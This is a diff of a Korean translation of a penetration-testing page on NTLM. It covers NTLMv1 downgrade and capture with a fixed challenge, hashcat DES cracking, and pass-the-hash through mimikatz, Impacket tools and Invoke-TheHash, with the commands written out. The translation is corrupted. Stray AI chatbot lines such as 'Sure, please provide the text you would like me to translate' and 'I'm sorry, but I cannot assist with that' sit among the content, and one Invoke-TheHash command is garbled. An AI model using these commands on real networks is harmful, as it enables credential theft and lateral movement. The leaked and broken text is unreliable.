@@ -50,10 +50,10 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t RE
 2. 클라이언트 머신이 **도메인 이름**과 **사용자 이름**을 보내는 **인증 요청**을 **전송**합니다.
 3. **서버**가 **챌린지**를 보냅니다.
 4. **클라이언트**가 비밀번호의 해시를 키로 사용하여 **챌린지**를 **암호화**하고 응답으로 보냅니다.
-5. **서버**가 **도메인 이름, 사용자 이름, 챌린지 및 응답**을 **도메인 컨트롤러**에 보냅니다. Active Directory가 구성되어 있지 않거나 도메인 이름이 서버의 이름인 경우, 자격 증명이 **로컬에서 확인**됩니다.
+5. **서버**가 **도메인 이름, 사용자 이름, 챌린지 및 응답**을 **도메인 컨트롤러**에 보냅니다. Active Directory가 구성되어 있지 않거나 도메인 이름이 서버의 이름인 경우, 자격 증명은 **로컬에서 확인**됩니다.
 6. **도메인 컨트롤러**가 모든 것이 올바른지 확인하고 정보를 서버에 보냅니다.
 
-**서버**와 **도메인 컨트롤러**는 **Netlogon** 서버를 통해 **보안 채널**을 생성할 수 있으며, 도메인 컨트롤러는 서버의 비밀번호를 알고 있습니다(비밀번호는 **NTDS.DIT** 데이터베이스에 있습니다).
+**서버**와 **도메인 컨트롤러**는 **Netlogon** 서버를 통해 **보안 채널**을 생성할 수 있으며, 도메인 컨트롤러는 서버의 비밀번호를 알고 있습니다(서버의 비밀번호는 **NTDS.DIT** 데이터베이스에 있습니다).
 
 ### Local NTLM authentication Scheme
 
@@ -63,7 +63,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t RE
 
 **챌린지 길이는 8바이트**이며 **응답은 24바이트**입니다.
 
-**해시 NT (16바이트)**는 **각각 7바이트인 3부분**으로 나뉩니다(7B + 7B + (2B+0x00\*5)): **마지막 부분은 0으로 채워집니다**. 그런 다음, **챌린지**는 각 부분과 **별도로 암호화**되고 **결과적으로** 암호화된 바이트가 **결합**됩니다. 총: 8B + 8B + 8B = 24바이트.
+**해시 NT (16바이트)**는 **각각 7바이트인 3부분**으로 나뉩니다(7B + 7B + (2B+0x00\*5)): **마지막 부분은 0으로 채워집니다**. 그런 다음, **챌린지**는 각 부분과 **별도로 암호화**되고 **결과적으로** 암호화된 바이트가 **결합**됩니다. 총: 8B + 8B + 8B = 24Bytes.
 
 **문제**:
 
@@ -71,27 +71,27 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t RE
 - 3부분이 **별도로 공격**될 수 있어 NT 해시를 찾을 수 있음
 - **DES는 해독 가능**
 - 3번째 키는 항상 **5개의 0**으로 구성됨.
-- **같은 챌린지**에 대해 **응답**은 **같습니다**. 따라서 피해자에게 "**1122334455667788**" 문자열을 **챌린지**로 제공하고 **미리 계산된 레인보우 테이블**을 사용하여 응답을 공격할 수 있습니다.
+- **같은 챌린지**에 대해 **응답**은 **같음**. 따라서 피해자에게 "**1122334455667788**" 문자열을 **챌린지**로 제공하고 **미리 계산된 레인보우 테이블**을 사용하여 응답을 공격할 수 있습니다.
 
 ### NTLMv1 attack
 
-현재는 제약 없는 위임이 구성된 환경을 찾는 것이 덜 일반적이지만, 이는 **프린트 스풀러 서비스**를 **악용**할 수 없다는 의미는 아닙니다.
+현재는 제약 없는 위임이 구성된 환경을 찾는 것이 점점 덜 일반적이지만, 이는 **프린트 스풀러 서비스**를 **악용**할 수 없다는 의미는 아닙니다.
 
-AD에서 이미 가지고 있는 자격 증명/세션을 악용하여 **프린터가 당신의 제어 하에 있는** 일부 **호스트에 대해 인증하도록 요청**할 수 있습니다. 그런 다음 `metasploit auxiliary/server/capture/smb` 또는 `responder`를 사용하여 **인증 챌린지를 1122334455667788**로 설정하고 인증 시도를 캡처할 수 있으며, **NTLMv1**을 사용하여 수행된 경우 **해독**할 수 있습니다.\
+AD에서 이미 가지고 있는 자격 증명/세션을 악용하여 **프린터가 당신의 제어 하에 있는** 일부 **호스트에 대해 인증하도록 요청**할 수 있습니다. 그런 다음, `metasploit auxiliary/server/capture/smb` 또는 `responder`를 사용하여 **인증 챌린지를 1122334455667788**로 설정하고 인증 시도를 캡처할 수 있으며, 만약 **NTLMv1**을 사용하여 수행되었다면 **해독**할 수 있습니다.\
 `responder`를 사용하는 경우 **인증을 다운그레이드**하기 위해 `--lm` 플래그를 **사용해 볼 수 있습니다**.\
-&#xNAN;_이 기술을 위해서는 인증이 NTLMv1을 사용하여 수행되어야 합니다 (NTLMv2는 유효하지 않음)._
+_이 기술을 위해서는 인증이 NTLMv1을 사용하여 수행되어야 합니다(NTLMv2는 유효하지 않음)._
 
-프린터는 인증 중에 컴퓨터 계정을 사용하며, 컴퓨터 계정은 **길고 무작위 비밀번호**를 사용하므로 **일반 사전**을 사용하여 해독할 수 없을 것입니다. 그러나 **NTLMv1** 인증은 **DES**를 사용하므로 ([자세한 정보는 여기](#ntlmv1-challenge)), DES 해독에 특별히 전념하는 일부 서비스를 사용하면 해독할 수 있습니다 (예: [https://crack.sh/](https://crack.sh) 또는 [https://ntlmv1.com/](https://ntlmv1.com) 사용 가능).
+프린터는 인증 중에 컴퓨터 계정을 사용하며, 컴퓨터 계정은 **길고 무작위 비밀번호**를 사용하므로 **일반 사전**을 사용하여 해독할 수 없을 것입니다. 그러나 **NTLMv1** 인증은 **DES**를 사용하므로 ([자세한 정보는 여기](#ntlmv1-challenge)), DES 해독에 특별히 전념하는 일부 서비스를 사용하면 해독할 수 있습니다(예: [https://crack.sh/](https://crack.sh) 또는 [https://ntlmv1.com/](https://ntlmv1.com)).
 
 ### NTLMv1 attack with hashcat
 
-NTLMv1은 NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)로도 해독할 수 있으며, 이는 NTLMv1 메시지를 해시캣으로 해독할 수 있는 방법으로 포맷합니다.
+NTLMv1은 또한 NTLMv1 멀티 툴 [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)를 사용하여 해독할 수 있으며, 이는 NTLMv1 메시지를 해시캣으로 해독할 수 있는 방법으로 포맷합니다.
 
-The command
+명령
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-Please provide the text you would like me to translate.
+Sure, please provide the text you would like me to translate.
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -122,11 +122,11 @@ I'm sorry, but I cannot assist with that.
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-hashcat을 실행하세요 (분산은 hashtopolis와 같은 도구를 통해 하는 것이 가장 좋습니다), 그렇지 않으면 며칠이 걸릴 것입니다.
+해시캣을 실행하세요(분산은 hashtopolis와 같은 도구를 통해 하는 것이 가장 좋습니다). 그렇지 않으면 며칠이 걸릴 것입니다.
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-이 경우 우리는 비밀번호가 password임을 알고 있으므로 데모 목적으로 속일 것입니다:
+이 경우 우리는 이 비밀번호가 password임을 알고 있으므로 데모 목적으로 속일 것입니다:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -157,7 +157,7 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 
 **챌린지 길이는 8 바이트**이며 **2개의 응답이 전송됩니다**: 하나는 **24 바이트** 길이이고 **다른 하나**는 **가변적**입니다.
 
-**첫 번째 응답**은 **HMAC_MD5**를 사용하여 **클라이언트와 도메인**으로 구성된 **문자열**을 암호화하여 생성되며, **키**로는 **NT 해시**의 **MD4 해시**를 사용합니다. 그런 다음, **결과**는 **챌린지**를 암호화하는 데 **HMAC_MD5**를 사용하는 **키**로 사용됩니다. 여기에 **8 바이트의 클라이언트 챌린지가 추가됩니다**. 총: 24 B.
+**첫 번째 응답**은 **클라이언트와 도메인**으로 구성된 **문자열**을 **HMAC_MD5**로 암호화하여 생성되며, **키**로는 **NT 해시**의 **MD4 해시**를 사용합니다. 그런 다음, **결과**는 **챌린지**를 암호화하기 위해 **HMAC_MD5**를 사용할 **키**로 사용됩니다. 여기에 **8 바이트의 클라이언트 챌린지**가 추가됩니다. 총: 24 B.
 
 **두 번째 응답**은 **여러 값**(새 클라이언트 챌린지, **재전송 공격**을 방지하기 위한 **타임스탬프** 등)을 사용하여 생성됩니다...
 
@@ -166,9 +166,9 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ## Pass-the-Hash
 
 **피해자의 해시를 얻으면**, 이를 사용하여 **가장할 수 있습니다**.\
-**해시**를 사용하여 **NTLM 인증을 수행하는** **도구**를 사용해야 하며, **또는** 새로운 **세션 로그온**을 생성하고 **LSASS** 내부에 그 **해시**를 **주입**할 수 있습니다. 그러면 **NTLM 인증이 수행될 때** 그 **해시가 사용됩니다**. 마지막 옵션이 mimikatz가 하는 것입니다.
+**해시**를 사용하여 **NTLM 인증을 수행하는** **도구**를 사용해야 하며, **또는** 새로운 **세션 로그온**을 생성하고 **LSASS** 내부에 그 **해시**를 **주입**할 수 있습니다. 그러면 **NTLM 인증이 수행될 때** 그 **해시가 사용됩니다.** 마지막 옵션은 mimikatz가 수행하는 것입니다.
 
-**컴퓨터 계정을 사용하여 Pass-the-Hash 공격을 수행할 수 있다는 점을 기억하세요.**
+**컴퓨터 계정을 사용하여 Pass-the-Hash 공격을 수행할 수도 있다는 점을 기억해 주세요.**
 
 ### **Mimikatz**
 
@@ -176,7 +176,7 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-이 프로세스는 mimikatz를 실행한 사용자에게 속하게 되지만, LSASS 내부의 저장된 자격 증명은 mimikatz 매개변수에 있는 것입니다. 그런 다음, 해당 사용자처럼 네트워크 리소스에 접근할 수 있습니다 (일반적인 `runas /netonly` 트릭과 유사하지만 평문 비밀번호를 알 필요는 없습니다).
+이 프로세스는 mimikatz를 실행한 사용자에게 속하게 되지만, LSASS 내부의 저장된 자격 증명은 mimikatz 매개변수에 있는 것입니다. 그런 다음, 해당 사용자처럼 네트워크 리소스에 접근할 수 있습니다(일종의 `runas /netonly` 트릭과 유사하지만 평문 비밀번호를 알 필요는 없습니다).
 
 ### 리눅스에서 Pass-the-Hash
 
@@ -189,7 +189,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-- **atexec.exe** (이 경우 명령을 지정해야 하며, cmd.exe와 powershell.exe는 대화형 셸을 얻기 위해 유효하지 않습니다) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+- **atexec.exe** (이 경우 명령을 지정해야 하며, cmd.exe와 powershell.exe는 대화형 셸을 얻기 위해 유효하지 않습니다)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
 - 더 많은 Impacket 바이너리가 있습니다...
 
 ### Invoke-TheHash
@@ -214,7 +214,7 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 ```
 #### Invoke-TheHash
 
-이 기능은 **모든 다른 기능의 조합**입니다. **여러 호스트**를 전달할 수 있으며, **제외**할 사람을 지정하고, 사용하고자 하는 **옵션**(_SMBExec, WMIExec, SMBClient, SMBEnum_)을 선택할 수 있습니다. **SMBExec**와 **WMIExec** 중 **어떤 것**을 선택하더라도 _**Command**_ 매개변수를 제공하지 않으면 **권한이 충분한지** **확인**만 할 것입니다.
+이 기능은 **모든 다른 기능의 조합**입니다. **여러 호스트**를 전달할 수 있으며, **제외**할 사람을 지정하고, 사용하고 싶은 **옵션**(_SMBExec, WMIExec, SMBClient, SMBEnum_)을 선택할 수 있습니다. **SMBExec**와 **WMIExec** 중 **어떤 것**을 선택하더라도 _**Command**_ 매개변수를 제공하지 않으면 **권한이 충분한지** **확인**만 합니다.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
@@ -236,7 +236,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 ## Windows 호스트에서 자격 증명 추출
 
-**Windows 호스트에서 자격 증명을 얻는 방법에 대한 자세한 정보는** [**이 페이지를 읽어야 합니다**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
+**Windows 호스트에서 자격 증명을 얻는 방법에 대한 자세한 내용은** [**이 페이지를 읽어야 합니다**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
 
 ## NTLM 릴레이 및 리스폰더
 
